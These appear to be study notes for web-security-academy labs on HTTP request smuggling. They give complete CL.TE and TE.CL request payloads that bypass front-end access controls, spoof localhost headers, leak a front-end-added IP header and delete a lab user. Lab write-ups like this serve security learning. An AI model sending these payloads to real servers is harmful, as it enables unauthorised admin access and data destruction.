# HTTP Request Smuggling Notes

You need to include the trailing sequence `\r\n\r\n` in burp following the 0 in requests using TE.CL

In addition, in burp uncheck the `Update Content-Length` header

## Methodology

### CL.TE example test

Example request to test for CL.TE

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X
```

Content-Length will be forwarded as it fits correctly, omitting the X. Then the Transfer-Encoding of the backend will process the first chunk (The 1, and A), then come to the X and awai for the next chunk to arrive causing a time delay.

### TE.CL Example test

Example request to test for TE.CL

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 6

0

X
```

The transfer encoding header gets checked and only passes part of the request, omitting the X. The back-end server uses the `Content-Length` header, expects more content in the message body and waits causing the time delay to detect.

## Labs Walkthrough

### HTTP request smuggling, confirming a CL.TE vulnerability via differential responses

Send this in repeater twice, to get a smuggle in and get a 404 error

```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
X-Ignore: X
```

### HTTP request smuggling, confirming a TE.CL vulnerability via differential responses

Send this twice

```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5e
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```

### Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability

- try to go to /admin
- use repeater and issue the following request twice

```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-Ignore: X
```

- the request gets denied due to not having the `Host:Localhost` header
- send the below requst twice

```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 54
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
X-Ignore: X
```

- the request was blocked due to the second request's Host header conflicting with the smuggled Host header.
- now do this so that the second requests headers are appened to the smuggled request body instead, and send twice

```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 116
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```

- you can now access the admin panel, craft the delection of carlos like so:

```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 139
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```

### Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability

- similar to above go to /admin see that you're blocked, so send blow twice

```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-length: 4
Transfer-Encoding: chunked

60
POST /admin HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```

**You need to include the trailing sequence \r\n\r\n following the final 0**

- make sure to include the `Host:localhost` header

```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

71
POST /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```

- now delete carlos

```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-length: 4
Transfer-Encoding: chunked

87
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```

### Exploiting HTTP request smuggling to reveal front-end request rewriting

To solve the lab, smuggle a request to the back-end server that reveals the header that is added by the front-end server. Then smuggle a request to the back-end server that includes the added header, accesses the admin panel, and deletes the user carlos. 

- again go to /admin, but notice it will only be loaded from 127.0.0.1, we find that the search function on the site reflects the value of the search parameter
- use burp repeater to issue the request twice

```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 124
Transfer-Encoding: chunked

0

POST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 200
Connection: close

search=test
```

- the reflected response should contain the second responses with the start of a rewritten HTTP request that we can attempt to pull the secret header from
- we find a header with a `X-*-IP` formated header in the rewritten reflected response, this should be added to our smuggled payload now

```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 143
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-*-IP: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
Connection: close

x=1
```

-  now delete carlos

```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 166
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
X-abcdef-Ip: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
Connection: close

x=1
```












